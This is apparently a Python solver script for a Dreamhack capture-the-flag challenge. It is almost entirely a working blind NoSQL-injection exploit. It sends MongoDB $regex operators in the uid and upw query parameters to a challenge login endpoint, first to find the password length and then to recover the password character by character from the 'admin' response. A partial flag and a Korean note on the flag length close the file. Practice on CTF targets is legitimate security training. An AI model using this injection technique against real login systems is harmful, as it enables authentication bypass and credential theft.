import urllib.request
from urllib.parse import urlencode
import requests

#define CO_MAXBLOCKS 30

url = 'http://host5.dreamhack.games:16487/login?'

chars = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm}'

# for i in range(0, 100):
#   params =  {'uid[$regex]': 'in$', 'upw[$regex]': '\w{'+str(i)+'}'}
#   response = requests.get(url+urlencode(params))
#   print(f'{i} = {response.text}')

# > 32

for i in chars:
  params =  {'uid[$regex]': 'in$', 'upw[$regex]': '{89e50fa6fafe2604e33c0ba05843d3df}'+i}
  response = requests.get(url+urlencode(params))
  if response.text == 'admin':
    print(i)


flag = "DH{" + "8" + "}"

# flag 는 28 자리